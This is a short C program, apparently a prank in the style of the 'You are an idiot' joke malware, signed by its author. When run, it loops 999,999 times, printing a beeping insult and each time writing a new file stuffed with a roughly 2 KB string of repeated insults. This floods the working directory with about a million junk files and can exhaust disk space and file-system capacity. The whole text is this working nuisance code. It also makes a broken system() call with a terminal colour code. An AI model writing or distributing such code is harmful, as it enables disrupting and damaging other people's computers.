#include <stdio.h>
#include <stdlib.h>

int main() {
    // BY SKAYLATK
    system("\033[31m");
    char fname[40];
    char g[] = "😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅";
    for (int i = 1; i <= 999999; i++) {
        printf("\aYOU ARE AN IDIOT \t");
        char fname[40];
        sprintf(fname, "LABESK%d.text", i);
        FILE *f;
        f = fopen(fname, "wb");
        if (f != NULL) {
            fwrite(g, sizeof(char), sizeof(g), f);
            fclose(f);
        }
    }
    return 0;
}
